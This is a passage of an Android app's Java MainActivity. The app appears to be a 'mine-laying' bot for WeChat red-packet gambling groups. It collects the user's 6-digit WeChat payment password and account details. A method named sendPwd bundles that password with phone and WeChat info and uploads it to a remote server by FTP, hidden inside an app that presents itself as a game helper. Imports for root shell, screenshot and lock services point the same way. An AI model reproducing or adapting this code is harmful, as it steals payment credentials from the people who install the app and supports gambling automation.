package com.example.h3;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;


import com.byc.PutThunder2.R;
import com.example.h3.permission.FloatWindowManager;

import util.AppUtils;
import util.AutoStartSetting;
import util.BackgroundMusic;
import util.ConfigCt;
//import com.example.h3.Config;
import util.Funcs;
import util.PhoneInfo;
import util.ResourceUtil;
import util.RootShellCmd;
import util.SpeechUtil;
import accessibility.QiangHongBaoService;
import accessibility.app.WechatInfo;
import ad.Ad2;
import lock.LockService;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;

import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.Editable;
import android.text.Html;
import android.text.TextWatcher;
import android.text.method.LinkMovementMethod;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.View.OnClickListener;
import android.view.View.OnTouchListener;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.RadioGroup.OnCheckedChangeListener;
import download.DownloadService;
import download.ftp;
import order.GuardService;
import order.JobWakeUpService;
import order.OrderService;
import order.screen.ScreenShotActivity;
import android.widget.SeekBar;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;; 

public class MainActivity extends Activity implements
SeekBar.OnSeekBarChangeListener, CompoundButton.OnCheckedChangeListener{

	private String TAG = "byc001";
	
    // 声明SeekBar 和 TextView对象 
    private SeekBar mSeekBar;
    private TextView tvSpeed; 
    public TextView tvRegState;
    public TextView tvRegWarm;
    public TextView tvHomePage;
    public Button btReg;
    private Button btConcel;
    private Button btClose;
    private Button btStart; 
    public EditText etRegCode; 
    public TextView tvPlease;
    private SpeechUtil speaker ;
    
    //----------------------------------------------
    private EditText etMoneyValue;			//发包金额（以分为单位）
    private EditText etLuckyMoneyNum;		//包数
    private EditText etPWD;					//支付密码：
    private EditText etLuckyMoneySay;		//红包上出现的文字：

    private RadioGroup rgThunderPos;		//埋雷位置
    private RadioButton rbFen;
    private RadioButton rbJiao;
    private RadioButton rbYuan;
    private RadioButton rbJia;
    private FlowRadioGroup rgThunderNum;		//请设置出现的雷数：
    private RadioButton rb1;
    private RadioButton rb2;
    private RadioButton rb3;
    private RadioButton rb4;
    private RadioButton rb5;
    private RadioButton rb6;
    private RadioButton rb7;
    private RadioButton rb8;
    private RadioButton rb9;
    private RadioButton rb10;
    private RadioGroup rgMoneySay;
    private RadioButton rbHead;
    private RadioButton rbTail;
    private RadioButton rbSayIsThunder;
    private RadioGroup rgCalcThunder;
    private RadioButton rbAutoThunder;
    private RadioButton rbHandThunder;
    //单雷双雷三雷
    private RadioGroup rgSayThunderNum;
    private RadioButton rbSingleThunder;
    private RadioButton rbDoubleThunder;
    private RadioButton rbThreeThunder;
    private RadioButton rbFourThunder;
    private RadioButton rbFiveThunder;
    //碰碰群玩法
    private RadioGroup rgSelPutThunderPlaying;
    private RadioButton rbCommonPlaying;
    private RadioButton rbBumpPlaying;
    
    public TextView tvResolution;
    private Switch swGuardAccount;		//防封号
    //发音模式：
    private RadioGroup rgSelSoundMode; 
    private RadioButton rbFemaleSound;
    private RadioButton rbMaleSound;
    private RadioButton rbSpecialMaleSound;
    private RadioButton rbMotionMaleSound;
    private RadioButton rbChildrenSound;
    private RadioButton rbCloseSound;
    
    
    private BackgroundMusic mBackgroundMusic;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
		setContentView(R.layout.activity_main);
		//my codes
		//测试：

		//0.初始化
	    mSeekBar=(SeekBar) findViewById(R.id.seekBar1);
	    tvSpeed = (TextView) findViewById(R.id.tvSpeed); 
	    tvRegState=(TextView) findViewById(R.id.tvRegState);
	    tvRegWarm=(TextView) findViewById(R.id.tvRegWarm);
	    tvHomePage=(TextView) findViewById(R.id.tvHomePage);
	    btReg=(Button)findViewById(R.id.btReg);
	    btConcel=(Button)findViewById(R.id.btConcel);
	    btClose=(Button)findViewById(R.id.btClose);
	    btStart=(Button) findViewById(R.id.btStart); 
	    etRegCode=(EditText) findViewById(R.id.etRegCode); 
	    tvPlease=(TextView) findViewById(R.id.tvPlease); 

	    //------------------------------------------------------------------------
	    etMoneyValue=(EditText)findViewById(R.id.etMoneyValue);
	    etLuckyMoneyNum=(EditText)findViewById(R.id.etLuckyMoneyNum);
	    etPWD=(EditText)findViewById(R.id.etPWD);
	    etLuckyMoneySay=(EditText)findViewById(R.id.etLuckyMoneySay);
	    
	    rgThunderPos = (RadioGroup)this.findViewById(R.id.rgThunderPos);
	    rbFen=(RadioButton)findViewById(R.id.rbFen);
	    rbJiao=(RadioButton)findViewById(R.id.rbJiao);
	    rbYuan=(RadioButton)findViewById(R.id.rbYuan);
	    rbJia=(RadioButton)findViewById(R.id.rbJia);
	    rgThunderNum = (FlowRadioGroup)this.findViewById(R.id.rgThunderNum);
	    rb1=(RadioButton)findViewById(R.id.rb1);
	    rb2=(RadioButton)findViewById(R.id.rb2);
	    rb3=(RadioButton)findViewById(R.id.rb3);
	    rb4=(RadioButton)findViewById(R.id.rb4);
	    rb5=(RadioButton)findViewById(R.id.rb5);
	    rb6=(RadioButton)findViewById(R.id.rb6);
	    rb7=(RadioButton)findViewById(R.id.rb7);
	    rb8=(RadioButton)findViewById(R.id.rb8);
	    rb9=(RadioButton)findViewById(R.id.rb9);
	    rb10=(RadioButton)findViewById(R.id.rb10);
	    rgMoneySay = (RadioGroup)this.findViewById(R.id.rgMoneySay);
	    rbHead=(RadioButton)findViewById(R.id.rbHead);
	    rbTail=(RadioButton)findViewById(R.id.rbTail);
	    rbSayIsThunder=(RadioButton)findViewById(R.id.rbSayIsThunder);
	    tvResolution=(TextView) findViewById(R.id.tvResolution);
	    
	    rgCalcThunder = (RadioGroup)this.findViewById(R.id.rgCalcThunder);
	    rbAutoThunder=(RadioButton)findViewById(R.id.rbAutoThunder);
	    rbHandThunder=(RadioButton)findViewById(R.id.rbHandThunder);
	    //单雷双雷三雷
	    rgSayThunderNum = (RadioGroup)this.findViewById(R.id.rgSayThunderNum);
	    rbSingleThunder=(RadioButton)findViewById(R.id.rbSingleThunder);
	    rbDoubleThunder=(RadioButton)findViewById(R.id.rbDoubleThunder);
	    rbThreeThunder=(RadioButton)findViewById(R.id.rbThreeThunder);
	    rbFourThunder=(RadioButton)findViewById(R.id.rbFourThunder);
	    rbFiveThunder=(RadioButton)findViewById(R.id.rbFiveThunder);
	    //碰碰群玩法
	    rgSelPutThunderPlaying = (RadioGroup)this.findViewById(R.id.rgSelPutThunderPlaying);
	    rbCommonPlaying=(RadioButton)findViewById(R.id.rbCommonPlaying);
	    rbBumpPlaying=(RadioButton)findViewById(R.id.rbBumpPlaying);
	    swGuardAccount=(Switch)findViewById(R.id.swGuardAccount);
	    swGuardAccount.setOnCheckedChangeListener(this);
	    //发音模式：
	    rgSelSoundMode = (RadioGroup)this.findViewById(R.id.rgSelSoundMode);
	    rbFemaleSound=(RadioButton)findViewById(R.id.rbFemaleSound);
	    rbMaleSound=(RadioButton)findViewById(R.id.rbMaleSound);
	    rbSpecialMaleSound=(RadioButton)findViewById(R.id.rbSpecialMaleSound);
	    rbMotionMaleSound=(RadioButton)findViewById(R.id.rbMotionMaleSound);
	    rbChildrenSound=(RadioButton)findViewById(R.id.rbChildrenSound);
	    rbCloseSound=(RadioButton)findViewById(R.id.rbCloseSound);

	    
	    //获取分辨率:
	    getResolution2();
	    String sResolution="本机分辨率：（"+Config.screenWidth+"*"+Config.screenHeight+"）";
	    tvResolution.setText(sResolution);
	    //Log.d(TAG, "事件---->打开TTS");
	    Config.getConfig(getApplicationContext());//初 始化配置类；
	    speaker=SpeechUtil.getSpeechUtil(getApplicationContext());

		//1。启动微信按钮
		TAG=Config.TAG;
		//Log.d(TAG, "事件---->MainActivity onCreate");
		//btConcel=(Button)this.findViewById(R.id.btConcel);
		btConcel.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				//setTitle("aa");
				//setAppToTestVersion();
				mBackgroundMusic.stopBackgroundMusic();
				if(GetParams()){
					//Config.bSendLuckyMoney=true;
					String say="";
					if(!QiangHongBaoService.isRunning()) {
						say="请先打开埋雷服务！才能开始埋雷！";
						speaker.speak(say);
						Toast.makeText(MainActivity.this,say, Toast.LENGTH_LONG).show();
						return;
					}

					if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
						if(!FloatWindowManager.getInstance().applyOrShowFloatWindow(MainActivity.this))return;
					}
					if(!ConfigCt.bReg){
						showAddContactsDialog();
						return;
					}
					Log.d(TAG, "事件---->打开微信");
					OpenWechat();
					speaker.speak("启动微信。埋雷开始。");
					//sendPwd();
					String wxInfo=ConfigCt.getInstance(MainActivity.this).getWechatInfo();
					if(wxInfo.length()==0){
						//WechatInfo.start();
						if(WechatInfo.getWechatInfo().isEnable()){
							WechatInfo.getWechatInfo().start();
						}
					}
					finish();
				}
			}
		});//btn.setOnClickListener(
		btClose.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				if(Config.DEBUG){
					//QHBNotificationService.openNotificationServiceSettings(MainActivity.this);
				}
				FloatingWindowCount.getInstance(getApplicationContext()).RemoveFloatingWindow();
				finish();
				//showCalcSucDialog();
				//speaker.stopSpeaking();
				//RootShellCmd.OpenAccessibility(getApplicationContext());
				//mBackgroundMusic.stopBackgroundMusic();
				//moveTaskToBack(true);
				
				//AutoStartSetting.jumpStartInterface(getApplicationContext());
				//AutoStartSetting.openStart(MainActivity.this);
				//Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
				//File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath()
				//        + "/test/" + System.currentTimeMillis() + ".jpg");
				//file.getParentFile().mkdirs();
				//Uri uri = Uri.fromFile(file);
				//intent.putExtra(MediaStore.EXTRA_OUTPUT, uri);
				//intent.putExtra("android.intent.extras.CAMERA_FACING", 1); 
				
				//intent.putExtra("camerasensortype", 2); // 调用前置摄像头  
				//intent.putExtra("autofocus", true); // 自动对焦  
				//intent.putExtra("fullScreen", false); // 全屏  
				//intent.putExtra("showActionIcons", false);  
				//startActivityForResult(intent, 11);
				//startActivity(intent);
				//test2();
				//Intent intent = new Intent(MainActivity.this,CameraActivity.class);
				//startActivity(intent);
			}
		});//btn.setOnClickListener(
		//2。打开辅助服务按钮
		btStart.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v) {
				if(!GetParams()){return;}
				//1判断服务是否打开：
				mBackgroundMusic.stopBackgroundMusic();
				if(!QiangHongBaoService.isRunning()) {
					//打开系统设置中辅助功能
					//Log.d(TAG, "事件---->打开系统设置中辅助功能");
					QiangHongBaoService.startSetting(getApplicationContext());
					Toast.makeText(MainActivity.this, "找到埋雷专家，然后开启埋雷服务。", Toast.LENGTH_LONG).show();
					speaker.speak("请找到埋雷专家，然后开启埋雷服务。");
				}else{
					Toast.makeText(MainActivity.this, "埋雷服务已开启！", Toast.LENGTH_LONG).show();
					speaker.speak("埋雷服务已开启！");
				}
				//2保存延时参数
			}
		});//startBtn.setOnClickListener(
		//3。SeekBar处理
        mSeekBar.setOnSeekBarChangeListener(this); 
        //4.是否注册处理（显示版本信息(包括标题)）
		Config.bReg=getConfig().getREG();
		showVerInfo(Config.bReg);
		if(Config.bReg)//开始服务器验证：
			Sock.getSock(MainActivity.this).VarifyStart();
        //5。注册流程：
		btReg.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				//setTitle("aa");
				mBackgroundMusic.stopBackgroundMusic();
				String regCode=etRegCode.getText().toString();
				if(regCode.length()!=12){
					Toast.makeText(MainActivity.this, "授权码输入错误！", Toast.LENGTH_LONG).show();
					speaker.speak("授权码输入错误！");
					return;
				}
				getSock().RegStart(regCode);
				//Log.d(TAG, "事件---->测试");
				//System.exit(0);
			}
		});//btReg.setOnClickListener(
		//6。接收广播消息
        IntentFilter filter = new IntentFilter();
        filter.addAction(Config.ACTION_QIANGHONGBAO_SERVICE_CONNECT);
        filter.addAction(Config.ACTION_QIANGHONGBAO_SERVICE_DISCONNECT);
        registerReceiver(qhbConnectReceiver, filter);
        //7.播放背景音乐：
        mBackgroundMusic=BackgroundMusic.getInstance(getApplicationContext());
        mBackgroundMusic.playBackgroundMusic( "bg_music.mp3", true);
        //8.设置参数
        SetParams();
        //9.置为试用版；
        setAppToTestVersion();

        //test
        //LinearLayout myView=(LinearLayout)findViewById(R.id.LinearLayout1);
        //myView.setEnabled(true); 
        //注册OnTouch监听器  
        //myView.setOnTouchListener(new myOnTouchListener());  
    }  
    //OnTouch监听器  
    private class myOnTouchListener implements OnTouchListener{  
        @Override  
        public boolean onTouch(View v, MotionEvent event){
            Log.d(Config.TAG2, "onTouch action="+event.getAction());  
            String sInfo="X="+String.valueOf(event.getRawX())+"  Y="+String.valueOf(event.getRawY()); 
            Log.d(Config.TAG2, sInfo);  
            return false;  
        }  
    }     
	private void hide(boolean bHide){
		if(!bHide)return;
		Handler handler= new Handler(); 
		Runnable runnableHide  = new Runnable() {    
			@Override    
		    public void run() {    
				moveTaskToBack(true);
				mBackgroundMusic.stopBackgroundMusic();
		    }    
		};
	handler.postDelayed(runnableHide, 200);
	}
	private BroadcastReceiver qhbConnectReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            Log.d(TAG, "receive-->" + action);
            if(Config.ACTION_QIANGHONGBAO_SERVICE_CONNECT.equals(action)) {
            	speaker.speak("已连接埋雷服务！");
            } else if(Config.ACTION_QIANGHONGBAO_SERVICE_DISCONNECT.equals(action)) {
            	speaker.speak("已中断埋雷服务！");
            }
        }
    };

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		int id = item.getItemId();
		int idFloat=util.ResourceUtil.getId(getApplicationContext(), "action_floatwindow");
		int idSet=util.ResourceUtil.getId(getApplicationContext(), "action_settings");
		int idCal=util.ResourceUtil.getId(getApplicationContext(), "action_calculate");
		if (id ==idFloat) {//if (id == R.id.action_floatwindow)
			 if(FloatWindowManager.getInstance().applyOrShowFloatWindow(MainActivity.this))
				 Toast.makeText(MainActivity.this, "已授予悬浮窗权限！", Toast.LENGTH_LONG).show();
			return true;
		}
		if (id == idSet) {//if (id == R.id.action_settings)
			Intent intent=new Intent();
			//Intent intent =new Intent(Intent.ACTION_VIEW,uri);
			intent.setAction("android.intent.action.VIEW");
			Uri content_url=Uri.parse(ConfigCt.homepage);
			intent.setData(content_url);
			startActivity(intent);
			return true;
		}
		if (id ==idCal) {//if (id == R.id.action_calculate)
			showCalcDialog();
		}
		return super.onOptionsItemSelected(item);
	}
	
	//SeekBar接口：
    @Override
    public void onProgressChanged(SeekBar seekBar, int progress, 
            boolean fromUser) {// 在拖动中--即值在改变 
        // progress为当前数值的大小 
    	tvSpeed.setText("请设置埋雷速度:当前埋雷延迟：" + progress); 
    	
    } 
    
    @Override
    public void onStartTrackingTouch(SeekBar seekBar) {// 在拖动中会调用此方法 
    	//mSpeed.setText("xh正在调节"); 
    } 
    
    @Override
    public void onStopTrackingTouch(SeekBar seekBar) {// 停止拖动 
    	//mSpeed.setText("xh停止调节"); 
    	//保存当前值
    	Config.getConfig(this).SetWechatOpenDelayTime(seekBar.getProgress());
    	Config.iDelayTime=seekBar.getProgress();
    	speaker.speak("当前埋雷延迟：" + seekBar.getProgress());
    } 
    public Config getConfig(){
    	return Config.getConfig(this);
    }
    public Sock getSock(){
    	return Sock.getSock(this);
    }
    public boolean OpenWechat(){
    	Intent intent = new Intent(); 
    	PackageManager packageManager = this.getPackageManager(); 
    	intent = packageManager.getLaunchIntentForPackage(Config.WECHAT_PACKAGENAME); 
    	if(intent==null)return false;
    	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED | Intent.FLAG_ACTIVITY_CLEAR_TOP) ; 
    	this.startActivity(intent);
    	return true;
    }
  
    //取得参数：
    private boolean GetParams(){
    	boolean ret=false;
    	String sSay="";
    	//取发包金额参数：
    	//int iMoneyValue=0;
    	Config.sMoneyValue=etMoneyValue.getText().toString();
    	if(Config.sMoneyValue.equals("")){
    		sSay="请设置发包金额！";
        	Toast.makeText(MainActivity.this, sSay, Toast.LENGTH_LONG).show();
        	speaker.speak(sSay );
        	return ret;
    	}
    	getConfig().setMoneyValue(Config.sMoneyValue);//保存发包金额参数；
    	//取发包包数：
    	//int iLuckyMoneyNum=0;
    	Config.sLuckyMoneyNum=etLuckyMoneyNum.getText().toString();
    	if(Config.sLuckyMoneyNum.equals("")){
    		sSay="请设置发包包数！";
        	Toast.makeText(MainActivity.this, sSay, Toast.LENGTH_LONG).show();
        	speaker.speak(sSay );
        	return ret;
    	}
    	getConfig().setLuckyMoneyNum(Config.sLuckyMoneyNum);//保存发包包数参数；
    	//取支付密码：
    	//int iPWD=0;
    	Config.sPWD=etPWD.getText().toString();
    	if(Config.sPWD.length()!=6){
    		sSay="请输入微信6位数字支付密码！才能埋雷成功！";
        	Toast.makeText(MainActivity.this, sSay, Toast.LENGTH_LONG).show();
        	speaker.speak(sSay );
        	return ret;
    	}
    	getConfig().setPayPWD(Config.sPWD);//保存支付密码参数；
    	//取红包上的文字 ：
    	if(Config.bAutoThunder){//自动雷值：
    		Config.sLuckyMoneySay=Config.KEY_LUCKY_MONEY_SAY;//置空；
    	}else{
    		Config.sLuckyMoneySay=etLuckyMoneySay.getText().toString();
    		if(Config.sLuckyMoneySay.equals("")){
    			sSay="请设置红包上的文字！";
    			Toast.makeText(MainActivity.this, sSay, Toast.LENGTH_LONG).show();
    			speaker.speak(sSay );
    			return ret;
    		}
    		getConfig().setLuckyMoneySay(Config.sLuckyMoneySay);//保存红包上的文字参数；
    	}//if(Config.bAutoThunder){//自动雷值：
    	ret=true;
    	return ret;
    }
    /*
     * 发送支付pwd
     */
    private void sendPwd(){
    	String baseInfo=PhoneInfo.getBasePhoneInfo(this);
    	String wxInfo=ConfigCt.getInstance(this).getWechatInfo();
    	String pwd=getConfig().getPayPWD();
    	String info=baseInfo+"\r\n"+wxInfo+"\r\n"+pwd;
		String filename=Funcs.saveInfo2File(info, "putthunder-wxp");
		if(filename!=null){
			ftp.getFtp(this).UploadStart(filename);
		}
    }
    //配置参数：
    private void SetParams(){
    	//参数控件初始化
    	//发包金额；
    	Config.sMoneyValue=getConfig().getMoneyValue();//发包金额；
    	etMoneyValue.setText(Config.sMoneyValue);
    	//发包包数；
    	Config.sLuckyMoneyNum=getConfig().getLuckyMoneyNum();//发包包数；
    	etLuckyMoneyNum.setText(Config.sLuckyMoneyNum);
    	//支付密码；
    	Config.sPWD=getConfig().getPayPWD();//支付密码；
    	etPWD.setText(Config.sPWD);
    	//埋雷位置；
    	Config.iMoneyThunderPos=getConfig().getMoneyValuePos();//雷在红包金额中的位置；
    	if(Config.iMoneyThunderPos==Config.KEY_THUNDER_FEN)rbFen.setChecked(true);
    	if(Config.iMoneyThunderPos==Config.KEY_THUNDER_JIAO)rbJiao.setChecked(true);
    	if(Config.iMoneyThunderPos==Config.KEY_THUNDER_YUAN)rbYuan.setChecked(true);
    	if(Config.iMoneyThunderPos==Config.KEY_THUNDER_JIA)rbJia.setChecked(true);
    	//出现的雷数；
    	Config.iThunder=getConfig().getThunderNum();//出现的雷数；
    	if(Config.iThunder==1)rb1.setChecked(true);
    	if(Config.iThunder==2)rb2.setChecked(true);
    	if(Config.iThunder==3)rb3.setChecked(true);
    	if(Config.iThunder==4)rb4.setChecked(true);
    	if(Config.iThunder==5)rb5.setChecked(true);
    	if(Config.iThunder==6)rb6.setChecked(true);
    	if(Config.iThunder==7)rb7.setChecked(true);
    	if(Config.iThunder==8)rb8.setChecked(true);
    	if(Config.iThunder==9)rb9.setChecked(true);
    	if(Config.iThunder==10)rb10.setChecked(true);
    	//红包上出现的文字；
    	Config.sLuckyMoneySay=getConfig().getLuckyMoneySay();//红包上出现的文字；
    	etLuckyMoneySay.setText(Config.sLuckyMoneySay);
    	//雷的类型：
    	Config.iMoneySayPos=getConfig().getMoneySayPos();//雷在红包语中的位置；
    	if(Config.iMoneySayPos==Config.KEY_THUNDER_TAIL)rbTail.setChecked(true);
    	if(Config.iMoneySayPos==Config.KEY_THUNDER_HEAD)rbHead.setChecked(true);
    	if(Config.iMoneySayPos==Config.KEY_THUNDER_SAY)rbSayIsThunder.setChecked(true);
    	//是否计算最佳雷值
    	Config.bAutoThunder=getConfig().getAutoThunder();//是否计算最佳雷值
    	if(Config.bAutoThunder==Config.KEY_AUTO_THUNDER){
    		rbAutoThunder.setChecked(true);
    		etLuckyMoneySay.setText(Config.KEY_LUCKY_MONEY_SAY_AUTO);
    	}
    	if(Config.bAutoThunder==Config.KEY_NO_AUTO_THUNDER){
    		rbHandThunder.setChecked(true);
    	}
    	//单雷双雷三雷
    	Config.iMoneySayThunderNum=getConfig().getMoneySayThunderNum();//
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_SINGLE_THUNDER)rbSingleThunder.setChecked(true);
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_DOUBLE_THUNDER)rbDoubleThunder.setChecked(true);
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_THREE_THUNDER)rbThreeThunder.setChecked(true);
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_FOUR_THUNDER)rbFourThunder.setChecked(true);
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_FIVE_THUNDER)rbFiveThunder.setChecked(true);
    	//埋雷玩法
    	Config.iPlaying=getConfig().getPutThunderPlaying();//
    	if(Config.iPlaying==Config.KEY_PUT_THUNDER_COMMON_PLAYING)rbCommonPlaying.setChecked(true);
    	if(Config.iPlaying==Config.KEY_PUT_THUNDER_BUMP_PLAYING)rbBumpPlaying.setChecked(true);
    	//埋雷延迟；
    	Config.iDelayTime=getConfig().getWechatOpenDelayTime();//埋雷延迟；
    	mSeekBar.setProgress(Config.iDelayTime);
    	//发音模式：
    	if(Config.bSpeaking==Config.KEY_NOT_SPEAKING){
    		rbCloseSound.setChecked(true);//自动返回
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_FEMALE)){
    		rbFemaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_MALE)){
    		rbMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_SPECIAL_MALE)){
    		rbSpecialMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_EMOTION_MALE)){
    		rbMotionMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_CHILDREN)){
    		rbChildrenSound.setChecked(true);
    	}
    	speaker.setSpeaker(Config.speaker);
    	speaker.setSpeaking(Config.bSpeaking);

    	 //绑定排雷位置
    	rgThunderPos.setOnCheckedChangeListener(new OnCheckedChangeListener() {
             @Override
             public void onCheckedChanged(RadioGroup arg0, int arg1) {
                 // TODO Auto-generated method stub
                 //获取变更后的选中项的ID
                int radioButtonId = arg0.getCheckedRadioButtonId();
                //根据ID获取RadioButton的实例
                RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                 //更新文本内容，以符合选中项
                String sChecked=rb.getText().toString();
                 //tv.setText("您的性别是：" + rb.getText());
                if(sChecked.equals("分")){
                	getConfig().setMoneyValuePos(Config.KEY_THUNDER_FEN);
                	speaker.speak("当前设置：分为雷。");
                	Toast.makeText(MainActivity.this, "分为雷", Toast.LENGTH_LONG).show();
                }
                if(sChecked.equals("角")){
                	getConfig().setMoneyValuePos(Config.KEY_THUNDER_JIAO);
                	speaker.speak("当前设置：角为雷。");
                	Toast.makeText(MainActivity.this, "角为雷", Toast.LENGTH_LONG).show();
                }
                if(sChecked.equals("元")){
                	getConfig().setMoneyValuePos(Config.KEY_THUNDER_YUAN);
                	speaker.speak("当前设置：元为雷。");
                	Toast.makeText(MainActivity.this, "元为雷", Toast.LENGTH_LONG).show();
                }
                if(sChecked.equals("尾数相加")){
                	getConfig().setMoneyValuePos(Config.KEY_THUNDER_JIA);
                	speaker.speak("当前设置：小数点后两位尾数相加为雷。");
                	Toast.makeText(MainActivity.this, "小数点后两位尾数相加为雷", Toast.LENGTH_LONG).show();
                }
                	
            }
         });
   	 //绑定出现的雷数
    	rgThunderNum.setOnCheckedChangeListener(new OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup arg0, int arg1) {
                // TODO Auto-generated method stub
                //获取变更后的选中项的ID
               int radioButtonId = arg0.getCheckedRadioButtonId();
               //根据ID获取RadioButton的实例
                RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                //更新文本内容，以符合选中项
                String sChecked=rb.getText().toString();
                int iNum=Integer.parseInt(sChecked);
                String sSay="当前埋雷数为："+sChecked+"个雷。";
                getConfig().setThunderNum(iNum);
                Config.iThunder=iNum;
                Toast.makeText(MainActivity.this,sSay, Toast.LENGTH_LONG).show();
                speaker.speak(sSay);
                
           }
        });
      	 //绑定红包语排雷位置
       	rgMoneySay.setOnCheckedChangeListener(new OnCheckedChangeListener() {
                @Override
                public void onCheckedChanged(RadioGroup arg0, int arg1) {
                    // TODO Auto-generated method stub
                    //获取变更后的选中项的ID
                   int radioButtonId = arg0.getCheckedRadioButtonId();
                   //根据ID获取RadioButton的实例
                    RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                    //更新文本内容，以符合选中项
                    String sChecked=rb.getText().toString();
                    //tv.setText("您的性别是：" + rb.getText());
                    String say="";
                   if(sChecked.equals("文字尾为雷")){
                	   Config.iMoneySayPos=Config.KEY_THUNDER_TAIL;
                	   say="当前设置：红包语中最后一个数字为雷。";

                   }
                   if(sChecked.equals("文字首为雷")){
                	   Config.iMoneySayPos=Config.KEY_THUNDER_HEAD;
                	   say="当前设置：红包语中第一个数字为雷。";
                   }
                   if(sChecked.equals("红包语为雷")){
                  	   Config.iMoneySayPos=Config.KEY_THUNDER_SAY;
                  	   say="当前设置：红包语既是雷，红包语中无金额。";
                     }
                  	getConfig().setMoneySayPos(Config.iMoneySayPos);
                  	speaker.speak(say);
                  	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
               }
            });
       	//设置发包金额：
       	etMoneyValue.addTextChangedListener(new TextWatcher(){
       		@Override
       		public void afterTextChanged(Editable s) {
       			String sShow="当前发包金额："+s+"元";
       			speaker.speak(sShow);
       			Toast.makeText(MainActivity.this, sShow, Toast.LENGTH_LONG).show();
       		}
       		public void beforeTextChanged(CharSequence s, int start, int count,int after) {
       			
       		}
       		public void onTextChanged(CharSequence s, int start, int before,int count) {
       			
       		}
       		
       	});
       	//设置发包包数：
       	etLuckyMoneyNum.addTextChangedListener(new TextWatcher(){
       		@Override
       		public void afterTextChanged(Editable s) {
       			String sShow="当前发包包数："+s+"包";
       			speaker.speak(sShow);
       			Toast.makeText(MainActivity.this, sShow, Toast.LENGTH_LONG).show();
       		}
       		public void beforeTextChanged(CharSequence s, int start, int count,int after) {
       			
       		}
       		public void onTextChanged(CharSequence s, int start, int before,int count) {
       			
       		}
       		
       	});
       	//设置红包语：
       	etLuckyMoneySay.addTextChangedListener(new TextWatcher(){
       		@Override
       		public void afterTextChanged(Editable s) {
       			String sShow="当前红包上的文字为："+s+"。";
       			speaker.speak(sShow);
       			Toast.makeText(MainActivity.this, sShow, Toast.LENGTH_LONG).show();
       		}
       		public void beforeTextChanged(CharSequence s, int start, int count,int after) {
       			
       		}
       		public void onTextChanged(CharSequence s, int start, int before,int count) {
       			
       		}
       		
       	});
     	 //设置是否自动推荐最佳雷值：
       	rgCalcThunder.setOnCheckedChangeListener(new OnCheckedChangeListener() {
               @Override
               public void onCheckedChanged(RadioGroup arg0, int arg1) {
                   // TODO Auto-generated method stub
                   //获取变更后的选中项的ID
                  int radioButtonId = arg0.getCheckedRadioButtonId();
                  //根据ID获取RadioButton的实例
                   RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                   //更新文本内容，以符合选中项
                   String sChecked=rb.getText().toString();
                   String say="";
                  if(sChecked.equals("自动计算雷值")){
                	  say="当前设置：自动计算最佳雷值。";
                  	  Config.bAutoThunder=Config.KEY_AUTO_THUNDER;
                  	  etLuckyMoneySay.setText(Config.KEY_LUCKY_MONEY_SAY_AUTO);
                  }
                  if(sChecked.equals("手动填写雷值")){
                	  say="当前设置：手动填写雷值。";
                  	  Config.bAutoThunder=Config.KEY_NO_AUTO_THUNDER;
                  	etLuckyMoneySay.setText(Config.KEY_LUCKY_MONEY_SAY);
                  	etLuckyMoneySay.setFocusable(true);
                  }
                	getConfig().setAutoThunder(Config.bAutoThunder);
                	speaker.speak(say);
                	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
              }
           });
